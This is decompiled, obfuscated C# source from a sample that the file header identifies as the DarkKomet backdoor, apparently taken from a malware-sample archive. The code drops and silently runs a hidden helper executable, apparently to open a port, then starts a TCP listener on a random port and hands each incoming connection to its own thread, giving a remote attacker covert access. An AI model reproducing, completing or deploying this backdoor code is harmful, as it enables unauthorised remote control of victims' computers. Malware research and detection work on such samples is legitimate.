// Decompiled with JetBrains decompiler
// Type:  
// Assembly: AudioHD, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C44212F0-6FD7-4886-BEB4-F43F84F3B277
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.Win32.DarkKomet.hzfh-26a1c6d83f8e03a282b89acec8aef19eabb2f72745381a243a94811e2d7d3cb6.exe

using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0006\u2001
{
  private static int \u0002;
  private static string \u0003 = \u0006\u2001.\u0002();
  private static \u0003\u2001 \u0005 = new \u0003\u2001();

  public static void \u0002()
  {
    try
    {
      \u0006\u2001.\u0002 = new Random().Next(1000, 9999);
      if (!\u0006\u2001.\u0002())
        return;
      TcpListener tcpListener = new TcpListener(\u0006\u2001.\u0002);
      tcpListener.Start();
      \u0006\u2001.\u0005.\u0002(\u0006\u2001.\u0002);
      while (true)
        new Thread(new ThreadStart(new \u0002\u2000(tcpListener.AcceptTcpClient()).\u0002)).Start();
    }
    catch (Exception ex)
    {
      \u0006\u2001.\u0005.\u0002(ex.ToString());
    }
  }

  private static bool \u0002()
  {
    try
    {
      System.IO.File.WriteAllBytes(\u0006\u2002.\u0002(-885880408), \u000F\u2001.\u0002());
      string str = \u0006\u2001.\u0002(\u0006\u2002.\u0002(-885880423) + \u0006\u2001.\u0003 + \u0006\u2002.\u0002(-885876484) + \u0006\u2001.\u0002.ToString() + \u0006\u2002.\u0002(-885876484) + \u0006\u2001.\u0002.ToString() + \u0006\u2002.\u0002(-885880429));
      if (str.Contains(\u0006\u2002.\u0002(-885880444)))
      {
        \u0006\u2001.\u0002(\u0006\u2002.\u0002(-885880423) + \u0006\u2001.\u0003 + \u0006\u2002.\u0002(-885876484) + \u0006\u2001.\u0002.ToString() + \u0006\u2002.\u0002(-885876484) + \u0006\u2001.\u0002.ToString() + \u0006\u2002.\u0002(-885880429));
        if (str.Contains(\u0006\u2002.\u0002(-885880444)))
        {
          System.IO.File.Delete(\u0006\u2002.\u0002(-885880408));
          return true;
        }
        System.IO.File.Delete(\u0006\u2002.\u0002(-885880408));
        return false;
      }
      System.IO.File.Delete(\u0006\u2002.\u0002(-885880408));
      return false;
    }
    catch
    {
      System.IO.File.Delete(\u0006\u2002.\u0002(-885880408));
      return false;
    }
  }

  public static string \u0002() => Dns.GetHostByName(Dns.GetHostName()).AddressList[0].ToString();

  public static string \u0002(string _param0)
  {
    Process process = new Process();
    process.StartInfo = new ProcessStartInfo()
    {
      WindowStyle = ProcessWindowStyle.Hidden,
      FileName = \u0006\u2002.\u0002(-885880408),
      Arguments = _param0,
      RedirectStandardOutput = true,
      UseShellExecute = false,
      CreateNoWindow = true
    };
    process.Start();
    return process.StandardOutput.ReadToEnd();
  }
}
